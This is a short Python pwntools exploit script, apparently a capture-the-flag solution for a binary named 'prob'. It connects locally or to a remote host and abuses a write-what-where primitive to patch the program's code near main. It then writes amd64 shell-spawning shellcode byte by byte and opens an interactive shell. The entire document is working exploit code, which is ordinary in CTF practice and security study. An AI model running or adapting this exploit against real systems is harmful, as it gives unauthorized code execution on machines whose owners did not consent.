import sys
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

def conn():
    code = ELF('./prob')
    if len(sys.argv) == 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = ELF('./libc.so.6')
    else:
        r = process('./prob')
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    return [r, code, libc]

def bstr(data):
    return str(data).encode('utf-8')


def change(ptr, val):
    p.sendlineafter(': ', bstr(ptr - 0x1000))
    p.sendlineafter(': ', bstr(val))

def change2(ptr, val):
    p.sendline(bstr(ptr - 0x1000))
    p.sendlineafter(': ', bstr(val))
    
p, code, libc = conn()

change(code.sym['main'] + 288 + 0x1, 0x8e)

for i, ch in enumerate(asm(shellcraft.amd64.linux.sh())):
    change2(code.sym['main'] + 290 + i, ch)

change2(code.sym['main'] + 288 + 0x1, 0x0)
p.interactive() 
